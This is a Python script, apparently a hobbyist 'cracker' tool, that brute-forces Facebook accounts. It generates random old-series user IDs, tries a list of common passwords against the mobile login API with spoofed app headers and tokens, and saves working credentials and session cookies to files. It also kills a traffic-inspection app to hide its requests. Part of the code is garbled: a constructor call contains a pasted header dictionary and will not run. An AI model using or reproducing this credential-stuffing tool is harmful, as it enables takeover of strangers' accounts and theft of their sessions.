# ===================================================================
# CREATED BY : ABIR
# WHATSAPP   : +8801850119684
# GITHUB     : ☠︎︎ ᴀʙɪʀ ᴛᴏᴏʟꜱ ☠︎︎
# ===================================================================


import os
import sys
import time
import re
import random
import uuid
import json
import subprocess
import pycurl
from io import BytesIO
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as sop
from random import choice as race
from string import digits, ascii_letters
import urllib.parse
import base64
import ctypes

# ===================================================================
# Initial Setup & Welcome
# ===================================================================

print('\x1b[1;91m[\x1b[1;97m-\x1b[1;91m] \x1b[1;92m WELCOME TO ABIR TOOLS. . . .')
os.system('xdg-open https://chat.whatsapp.com/CQchXoK2m4R4Sxz3NNI1hu')
time.sleep(2)

# ===================================================================
# Color Definitions and UI Strings
# ===================================================================

A = '\x1b[1;97m'
G = '\x1b[38;5;48m'
B = '\x1b[38;5;8m'
F = '\x1b[38;5;40m'
G1 = '\x1b[38;5;46m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
A1 = '\x1b[38;5;152m'
A2 = '\x1b[38;5;153m'
A3 = '\x1b[38;5;154m'
A4 = '\x1b[38;5;155m'
A6 = '\x1b[38;5;156m'
A7 = '\x1b[38;5;157m'
M = '\x1b[38;5;205m'

s = f"{A4}|{G}-{A}[{G4}1{A}]{G3}"
b = f"{A4}|{G}-{A}[{G4}2{A}]{G4}"
c = f"{A4}|{G}-{A}[{G4}3{A}]{G2}"
d = f"{A4}|{G}-{A}[{G4}0{A}]{G}"
e = f"{A4}|{G}-{A}[{G4}4{A}]{G}"
f = f"{A4}|{G}-{A}[{G4}5{A}]{G}"
g = f"{A4}|{G}-{A}[{G4}6{A}]{G}"
inp = f"{A4}|{G}-{A2}({A1}*{A2}) {G3}"
lop = f"{A4}|{G}--"


# ===================================================================

class UserAgentGenerator:
    def __init__(self):
        self.custom_user_agents = [
            'Mozilla/5.0 (Linux; Android 12; SM-A127F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36 [FBAN/FB4A;FBAV/395.0.0.35.120;FBBV/345678;FBDM/{density=2.0,width=720,height=1600};FBLC/en_US;FBRV/412345;FBCR/T-Mobile;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-A127F;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]',
            '[FBAN/Orca-Android;FBAV/570.0.0.388.460;FBBV/91567890;FBDM/{density=2.75,width=1080,height=2400};FBLC/en_US;FBCR/T-Mobile;FBMF/Motorola;FBBD/Motorola;FBPN/com.facebook.orca;FBDV/moto g52;FBSV/13;FBOP/1;FBCA/arm64-v8a;]'
        ]

    def generate_user_agent(self):
        # This function generates a variety of user agents
        android_version = random.randint(9, 13)
        chrome_version = f"{random.randint(100, 120)}.0.{random.randint(5000, 6000)}.{random.randint(100, 200)}"
        build = ''.join(random.choices(ascii_letters.upper() + digits, k=6))
        device_models = ['SM-G991U', 'SM-A525F', 'Pixel 6 Pro', 'OnePlus 9 Pro']
        model = random.choice(device_models)
        
        ua = (f"Mozilla/5.0 (Linux; Android {android_version}; {model}) "
              f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version} "
              f"Mobile Safari/537.36")
        return ua

user_agent_generator = UserAgentGenerator(accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=smJhaHalQv444cYDkwXoMckP; sb=smJhaPSzi5ngnrJ1_ODsBV-2; vpd=v1%3B666x360x1.7004296779632568; ps_l=1; ps_n=1; pas=100002720612614%3AakrgDC9nxI%2C100050568219781%3AHgTR9buYUZ%2C100009320389076%3ANbG3s4tqkN%2C61555066127900%3AsDMFXNqbeU; locale=en_GB; wl_cbv=v2%3Bclient_version%3A2865%3Btimestamp%3A1752155483; dpr=1.8695321083068848; m_pixel_ratio=1.7004296779632568; wd=360x806; fr=0tLXoGa0wcCGh3Kas.AWc18oiJyNU-inWPxxbwSuQ9EI6SzmdfVEvq0lJZnvWNQb1HTPU.BoYWKy..AAA.0.0.BocEZ6.AWfSFLHpkWM3lXzqOfl289DZeCM',
    'dpr': '2',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-full-version-list': '"Chromium";v="139.0.7339.0", "Not;A=Brand";v="99.0.0.0"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"Infinix X665E"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"12.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent':)

# ===================================================================
# Banners and UI Elements
# ===================================================================
os.system('pkill -f httcanary >/dev/null 2>&1')

class NebulaColors:
    def __init__(self):
        self.W = '\x1b[97;1m'
        self.R = '\x1b[91;1m'
        self.G = '\x1b[92;1m'
        self.Y = '\x1b[93;1m'
        self.B = '\x1b[94;1m'
        self.P = '\x1b[95;1m'
        self.C = '\x1b[96;1m'
        self.N = '\x1b[0m'

def pro_banner():
    color = NebulaColors()
    # নতুন ব্যানার
    return (f'''
\x1b[1;96m
     _    ____ ___ ____    _____ ___   ___  _     ____  
    / \  | __ )_ _|  _ \  |_   _/ _ \ / _ \| |   / ___| 
   / _ \ |  _ \| || |_) |   | || | | | | | | |   \___ \ 
  / ___ \| |_) | ||  _ <    | || |_| | |_| | |___ ___) |
 /_/   \_\____/___|_| \_\   |_| \___/ \___/|_____|____/                                                     
\x1b[1;95m╔═══════════════════════════════════════════════════════╗
\x1b[1;95m║\x1b[1;97m                ✦  𝗧𝗢𝗢𝗟 I𝗡𝗙𝗢 𝗣𝗔𝗡𝗘𝗟  ✦                  \x1b[1;95m║
\x1b[1;95m╚═══════════════════════════════════════════════════════╝
\x1b[1;96m   ➤ \x1b[1;97mCreator        : \x1b[1;96m☠︎︎ ᴀʙɪʀ ᴛᴏᴏʟꜱ ☠︎︎
\x1b[1;96m   ➤ \x1b[1;97mTool Name      : \x1b[1;92m☠︎︎ ᴀʙɪʀ ᴛᴏᴏʟꜱ ☠︎︎  \x1b[1;91m(\x1b[1;90mVIP\x1b[1;91m)
\x1b[1;96m   ➤ \x1b[1;97mTool Access    : \x1b[1;93mFree
\x1b[1;96m   ➤ \x1b[1;97mCurrent Version: \x1b[1;95m2.0
\x1b[1;92m─────────────────────────────────────────────────────────''')

def linex():
    color = NebulaColors()
    print(f'  {color.P}╔═━─━━━━━━━━━━━━━━━━━━━━━━━━━━━━─━═╗')
    print(f'  {color.P}║    {color.Y}★ PREMIUM TOOL INTERFACE ★    {color.P}║')
    print(f'  {color.P}╚═━─━━━━━━━━━━━━━━━━━━━━━━━━━━━━─━═╝{color.N}')


# ===================================================================
# Main Cracker Class
# ===================================================================

class AbirCracker:
    def __init__(self):
        self.oks = []
        self.cps = []
        self.loop = 0
        self.color = NebulaColors()
        self.user_agents = [user_agent_generator.generate_user_agent() for _ in range(200)]

    def old_menu(self):
        clear()
        print(f'{self.color.P}╔═━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═╗')
        print(f'{self.color.P}║         {self.color.Y}★ OLD ACCOUNT CRACKER ★         {self.color.P}║')
        print(f'{self.color.P}╠═━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═╣')
        print(f'{self.color.P}║ {self.color.C}[1] {self.color.G}CRACK 2009 ACCOUNTS                 {self.color.P}║')
        print(f'{self.color.P}║ {self.color.C}[2] {self.color.G}CRACK 2009-2013 ACCOUNTS            {self.color.P}║')
        print(f'{self.color.P}║ {self.color.C}[0] {self.color.R}⇦ BACK TO MAIN MENU                 {self.color.P}║')
        print(f'{self.color.P}╚═━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═╝')

        choice = input(f'  {self.color.C}\x1b[1;96m ➤ Choose: {self.color.W}').strip()
        if choice in ('1', '01'):
            self.execute_breach('100000')
        elif choice in ('2', '02'):
            self.quantum_breach_menu()
        elif choice in ('0', '00'):
            return
        else:
            print(f'\n  {self.color.R}⚠ Invalid choice!')
            time.sleep(2)
            self.old_menu()

    def quantum_breach_menu(self):
        clear()
        series_map = {'1': '100000', '2': '100001', '3': '100002', '4': '100003', '5': '100004'}
        print(f'  {self.color.W}\x1b[1;96m ➤ Select Series:')
        for num, prefix in series_map.items():
            print(f'  {self.color.W}[{self.color.G}{num}{self.color.W}] {self.color.C}{prefix}')

        linex()
        choice = input(f'  {self.color.C}\x1b[1;96m ➤ Choose: {self.color.W}').strip()
        selected_prefix = series_map.get(choice)

        if not selected_prefix:
            print(f'  {self.color.R}⚠ Invalid Series!')
            time.sleep(2)
            self.quantum_breach_menu()
            return

        self.execute_breach(selected_prefix)

    def execute_breach(self, prefix):
        try:
            clear()
            limit = int(input(f'  {self.color.G}\x1b[1;96m ➤ Enter Limit: {self.color.W}'))
        except ValueError:
            print(f'  {self.color.R}⚠ Invalid Number!')
            time.sleep(2)
            self.old_menu()
            return

        targets = [prefix + ''.join(random.choices(digits, k=9)) for _ in range(limit)]
        passlist = ['123456789', '123456', '12345678', '1234567', '1234567890', '1122334455']

        with tred(max_workers=30) as executor:
            clear()
            print(f'  {self.color.W}\x1b[1;96m   ➤ Cracking {self.color.Y}{prefix} series')
            print(f'  {self.color.W}\x1b[1;96m   ➤ Total Targets: {self.color.G}{len(targets)}')
            linex()

            for target in targets:
                executor.submit(self.breach_target, target, passlist)

        self.display_results()

    def breach_target(self, target, passlist):
        self.loop += 1
        # নাম পরিবর্তন করে ABIR করা হয়েছে
        sys.stdout.write(f'\r  {self.color.W}[ABIR] {self.loop}|{self.color.G}{len(self.oks)}|{self.color.Y}{len(self.cps)}{self.color.W}')
        sys.stdout.flush()

        for password in passlist:
            if self.try_breach(target, password):
                return

    def try_breach(self, uid, password):
        try:
            ua = random.choice(self.user_agents)

            headers = {
                'User-Agent': ua,
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123Dior23437a4a32',
                'X-FB-Connection-Quality': 'EXCELLENT',
                'X-FB-HTTP-Engine': 'Liger',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'b-graph.facebook.com'
            }

            payload = {
                'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),
                'cpl': 'true','family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password','error_detail_type': 'button_with_disabled',
                'source': 'device_based_login','email': uid,'password': password,
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1','meta_inf_fbmeta': 'NO_FILE',
                'advertiser_id': str(uuid.uuid4()),'currently_logged_in_userid': '0',
                'locale': 'en_US','client_country_code': 'US','method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }

            encoded_payload = urllib.parse.urlencode(payload)
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://b-graph.facebook.com/auth/login')
            c.setopt(c.POST, 1)
            c.setopt(c.POSTFIELDS, encoded_payload)
            c.setopt(c.WRITEDATA, buffer)
            c.setopt(c.TIMEOUT, 15)
            header_list = [f"{key}: {value}" for key, value in headers.items()]
            c.setopt(c.HTTPHEADER, header_list)
            c.perform()
            response_body = buffer.getvalue().decode('utf-8')
            response = json.loads(response_body)
            c.close()
            buffer.close()

            if 'session_key' in response:
                self.handle_success(uid, password, response)
                return True
            elif 'www.facebook.com' in response.get('error', {}).get('message', ''):
                self.handle_partial(uid, password)
                return True

        except Exception:
            pass

        return False

    def handle_success(self, uid, password, response):
        coki = ';'.join([f"{c['name']}={c['value']}" for c in response.get('session_cookies', [])])
        print(f'\r  {self.color.G}\x1b[1;92m[ABIR-OK] {uid} | {password} | {coki}  {self.color.W}')
        # ফাইল সেভের নাম পরিবর্তন
        with open('/sdcard/ABIR-OK.txt', 'a') as f:
            f.write(f'{uid}|{password}|{coki}\n')
        self.oks.append(uid)

    def handle_partial(self, uid, password):
        print(f'\r  {self.color.Y}\x1b[1;93m[☠︎︎ ᴀʙɪʀ ᴛᴏᴏʟꜱ ☠︎︎-CP] {uid} | {password}                {self.color.W}')
        # ফাইল সেভের নাম পরিবর্তন
        with open('/sdcard/ABIR-CP.txt', 'a') as f:
            f.write(f'{uid}|{password}\n')
        self.cps.append(uid)

    def display_results(self):
        clear()
        print(f'  {self.color.G}\x1b[1;96m   ➤ CRACKING COMPLETE')
        linex()
        print(f'  {self.color.W}TOTAL OK: {self.color.G}{len(self.oks)}')
        print(f'  {self.color.W}TOTAL CP: {self.color.Y}{len(self.cps)}')
        linex()
        print(f'  {self.color.C}OK files saved in: /sdcard/ABIR-OK.txt')
        print(f'  {self.color.C}CP files saved in: /sdcard/ABIR-CP.txt')
        linex()
        input(f'  {self.color.C}Press ENTER to return to menu {self.color.W}')
        self.old_menu()

# ===================================================================
# Entry Point
# ===================================================================

def clear():
    os.system('clear')
    print(pro_banner())

if __name__ == '__main__':
    try:
        cracker = AbirCracker()
        cracker.old_menu()
    except KeyboardInterrupt:
        print('\n\x1b[91;1m   ➤ Tool Stopped By User\x1b[97;1m')
        sys.exit()
    except Exception as e:
        print(f'\n\x1b[91;1m   ➤ An Error Occurred: {str(e)}\x1b[97;1m')
        sys.exit()
